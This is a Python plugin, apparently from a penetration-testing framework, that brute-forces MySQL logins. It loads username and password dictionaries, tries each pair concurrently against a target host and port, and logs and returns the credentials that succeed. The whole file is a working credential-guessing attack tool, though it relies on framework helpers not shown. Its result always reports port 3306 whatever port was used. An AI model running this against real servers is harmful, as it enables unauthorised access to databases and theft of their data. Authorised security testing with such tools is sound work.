# -*-* coding:UTF-8
import os
import pymysql


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "mysql服务口令破解",
        "datetime": "2021-12-27"
    }

    @cli.options('port', desc="设置爆破端口", default=3306)
    @cli.options('method', desc="设置口令爆破的模式,1:单点模式;2:交叉模式", default=1)
    @cli.options('username', desc="用户账号或字典文件", default=os.path.join('data', 'mysql_username.dict'))
    @cli.options('password', desc="用户密码或字典文件", default=os.path.join('data', 'mysql_password.dict'))
    @cli.options('timeout', desc="设置连接超时时间", default=5)
    def ip(self, port, method, username, password, timeout) -> dict:
        with self.async_pool(max_workers=self.target.setting.asyncio, threshold=self.threshold) as execute:
            for u, p in self.build_login_dict(
                    method=method,
                    username=username,
                    password=password,
            ):
                execute.submit(self.task, port, u, p, timeout)
            return {'LoginInfo': execute.result()}

    async def task(self, port, username, password, timeout):
        self.log.debug(f'Login => username: {username}, password: {password}')
        conn = pymysql.connect(
            host=self.target.value,
            port=port,
            user=username,
            passwd=password,
            connect_timeout=timeout
        )
        conn.close()
        self.log.info(f'Login => username: {username}, password: {password} [success]')
        return {
            'port': 3306,
            'server': 'mysql',
            'username': username,
            'password': password
        }
